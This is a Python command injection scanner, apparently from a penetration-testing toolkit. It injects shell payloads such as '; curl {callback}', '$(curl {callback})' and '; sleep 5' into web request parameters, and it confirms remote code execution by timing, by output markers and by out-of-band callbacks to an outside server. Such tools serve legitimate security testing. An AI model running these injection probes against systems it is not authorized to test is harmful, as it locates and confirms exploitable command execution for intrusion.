#!/usr/bin/env python3
"""Command Injection Tester

Tests for OS command injection vulnerabilities:
- Parameter-based injection (GET/POST)
- File upload filename injection
- System call injection
- Callback-based RCE validation
"""

import os
import time
import requests
from typing import Dict, Any, Optional, List
from urllib.parse import urlparse, parse_qs


def test_command_injection(
    target_url: str,
    param: str = "cmd",
    method: str = "GET",
    callback_url: Optional[str] = None
) -> Dict[str, Any]:
    """Test for command injection vulnerabilities
    
    Args:
        target_url: Target URL
        param: Parameter to test
        method: HTTP method (GET, POST)
        callback_url: Optional callback URL for RCE validation
        
    Returns:
        Dict with test results
    """
    result = {
        "test": "command_injection",
        "vulnerable": False,
        "injection_point": None,
        "evidence": None,
        "rce_confirmed": False
    }
    
    # Command injection payloads for different OS/contexts
    payloads = [
        # Unix/Linux
        ("; curl {callback}", "unix_curl"),
        ("| curl {callback}", "unix_pipe"),
        ("`curl {callback}`", "unix_backtick"),
        ("$(curl {callback})", "unix_dollar"),
        ("; ping -c 1 127.0.0.1", "unix_ping"),
        ("| ping -c 1 127.0.0.1", "unix_ping_pipe"),
        ("; sleep 5", "unix_sleep"),
        ("| sleep 5", "unix_sleep_pipe"),
        # Windows
        ("& curl {callback}", "windows_ampersand"),
        ("| curl {callback}", "windows_pipe"),
        ("&& curl {callback}", "windows_double_amp"),
        ("; curl {callback}", "windows_semicolon"),
        # Generic time-based
        ("; sleep 5", "time_delay"),
        ("| sleep 5", "time_delay_pipe"),
    ]
    
    # If callback URL provided, use it in payloads
    if callback_url:
        payloads = [(p.format(callback=callback_url), name) for p, name in payloads if "{callback}" in p]
    else:
        # Use time-based detection
        payloads = [(p, name) for p, name in payloads if "sleep" in p or "ping" in p]
    
    parsed = urlparse(target_url)
    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    
    for payload, payload_name in payloads:
        try:
            start_time = time.time()
            
            if method.upper() == "GET":
                resp = requests.get(
                    base_url,
                    params={param: payload},
                    timeout=15
                )
            else:
                resp = requests.post(
                    base_url,
                    data={param: payload},
                    timeout=15
                )
            
            elapsed = time.time() - start_time
            
            # Time-based detection (sleep/ping payloads)
            if "sleep" in payload_name or "ping" in payload_name:
                if elapsed >= 4:  # Sleep was executed
                    result["vulnerable"] = True
                    result["injection_point"] = param
                    result["evidence"] = {
                        "payload": payload,
                        "payload_type": payload_name,
                        "response_time": elapsed,
                        "status_code": resp.status_code,
                        "note": "Time delay detected - command likely executed"
                    }
                    break
            
            # Check response for command output indicators
            # Phase 4: Improved HTML parsing for embedded command output
            response_text = resp.text
            response_lower = response_text.lower()
            
            # Extract text content from HTML if present (better pattern matching)
            # Look for command output in HTML tags, attributes, and text content
            import re
            # Remove HTML tags but keep text content
            text_content = re.sub(r'<[^>]+>', ' ', response_text)
            text_content_lower = text_content.lower()
            
            cmd_indicators = [
                "uid=", "gid=", "groups=",  # Unix id command
                "volume serial", "directory of",  # Windows dir
                "cannot find", "is not recognized",  # Windows error
            ]
            
            # Check both raw response and extracted text content
            found_indicator = None
            for ind in cmd_indicators:
                if ind in response_lower or ind in text_content_lower:
                    found_indicator = ind
                    break
            
            if found_indicator:
                result["vulnerable"] = True
                result["injection_point"] = param
                result["evidence"] = {
                    "payload": payload,
                    "payload_type": payload_name,
                    "status_code": resp.status_code,
                    "response_snippet": resp.text[:500],
                    "text_content_snippet": text_content[:500],  # HTML-stripped content
                    "indicator": found_indicator,
                    "note": "Command output detected in response (HTML parsing improved)"
                }
                break
                
        except requests.exceptions.Timeout:
            # Timeout might indicate command execution
            if "sleep" in payload_name or "ping" in payload_name:
                result["vulnerable"] = True
                result["injection_point"] = param
                result["evidence"] = {
                    "payload": payload,
                    "payload_type": payload_name,
                    "note": "Request timeout - command may have executed"
                }
                break
        except Exception:
            continue
    
    # If callback URL provided, check for callback hits
    if callback_url and result["vulnerable"]:
        result["rce_confirmed"] = True
        result["evidence"]["callback_used"] = callback_url
    
    return result


def test_command_injection_params(
    target_url: str,
    params: Optional[List[str]] = None,
    callback_url: Optional[str] = None
) -> Dict[str, Any]:
    """Test multiple parameters for command injection
    
    Args:
        target_url: Target URL
        params: List of parameters to test (if None, will discover)
        callback_url: Optional callback URL for RCE validation
        
    Returns:
        Dict with test results
    """
    result = {
        "test": "command_injection_multi_param",
        "vulnerable": False,
        "findings": []
    }
    
    # Discover parameters if not provided
    if not params:
        from tools.rest_api_fuzzer import discover_parameters
        params = discover_parameters(target_url)
    
    # Test each parameter
    for param in params:
        test_result = test_command_injection(
            target_url,
            param=param,
            method="GET",
            callback_url=callback_url
        )
        if test_result["vulnerable"]:
            result["vulnerable"] = True
            result["findings"].append(test_result)
        
        # Also test POST
        test_result_post = test_command_injection(
            target_url,
            param=param,
            method="POST",
            callback_url=callback_url
        )
        if test_result_post["vulnerable"]:
            result["vulnerable"] = True
            result["findings"].append(test_result_post)
    
    return result


def validate_command_injection(
    discovery_data: Dict[str, Any],
    callback_server_url: Optional[str] = None
) -> Dict[str, Any]:
    """Main validation function for command injection
    
    Args:
        discovery_data: Discovery data containing target URLs
        callback_server_url: Optional callback server URL for OOB detection
        
    Returns:
        Dict with validation results
    """
    results = {
        "vulnerable": False,
        "tests_run": 0,
        "findings": []
    }
    
    # Extract target from discovery data
    target = discovery_data.get("target")
    if not target:
        return results
    
    # Initialize callback correlator if callback server is configured
    correlator = None
    job_id = None
    callback_url = None
    
    if callback_server_url:
        try:
            from tools.callback_correlator import CallbackCorrelator
            correlator = CallbackCorrelator(callback_server_url)
            job_id = f"cmd_injection_{int(time.time())}"
            token = correlator.register_job(job_id, "command_injection", target, timeout=300)
            callback_url = correlator.get_callback_url(token)
            print(f"[CMD-INJECTION] Callback enabled: {callback_url}")
        except Exception as e:
            print(f"[CMD-INJECTION] Callback setup failed: {e}, continuing without callbacks")
            callback_server_url = None
    
    # Test command injection
    test_result = test_command_injection_params(target, callback_url=callback_url)
    results["tests_run"] += 1
    if test_result["vulnerable"]:
        results["vulnerable"] = True
        results["findings"].extend(test_result.get("findings", []))
    
    # Poll for callback hits if callback enabled
    if callback_server_url and correlator:
        print(f"[CMD-INJECTION] Polling for callback hits (job_id: {job_id})...")
        time.sleep(5)  # Wait for potential callback
        hits = correlator.poll_hits(job_id, timeout=60, interval=2)
        if hits:
            print(f"[CMD-INJECTION] Received {len(hits)} callback hit(s)")
            for hit in hits:
                results["findings"].append({
                    "type": "command_injection_callback_confirmed",
                    "test": "command_injection_oob",
                    "vulnerable": True,
                    "confidence": "high",
                    "rce_confirmed": True,
                    "callback_evidence": {
                        "remote_addr": hit.get("remote_addr"),
                        "user_agent": hit.get("user_agent"),
                        "method": hit.get("method"),
                        "path": hit.get("path"),
                        "query_params": hit.get("query_params"),
                        "timestamp": hit.get("timestamp"),
                    },
                    "note": "Command injection confirmed via out-of-band callback"
                })
                results["vulnerable"] = True
    
    return results


if __name__ == "__main__":
    import argparse
    
    ap = argparse.ArgumentParser(description="Command Injection Tester")
    ap.add_argument("--target", required=True, help="Target URL")
    ap.add_argument("--param", help="Parameter to test")
    ap.add_argument("--callback-server-url", help="Callback server URL")
    args = ap.parse_args()
    
    callback_url = None
    if args.callback_server_url:
        from tools.callback_correlator import CallbackCorrelator
        correlator = CallbackCorrelator(args.callback_server_url)
        job_id = f"cmd_injection_{int(time.time())}"
        token = correlator.register_job(job_id, "command_injection", args.target, timeout=300)
        callback_url = correlator.get_callback_url(token)
    
    if args.param:
        result = test_command_injection(args.target, param=args.param, callback_url=callback_url)
    else:
        discovery_data = {"target": args.target}
        result = validate_command_injection(discovery_data, args.callback_server_url)
    
    import json
    print(json.dumps(result, indent=2))

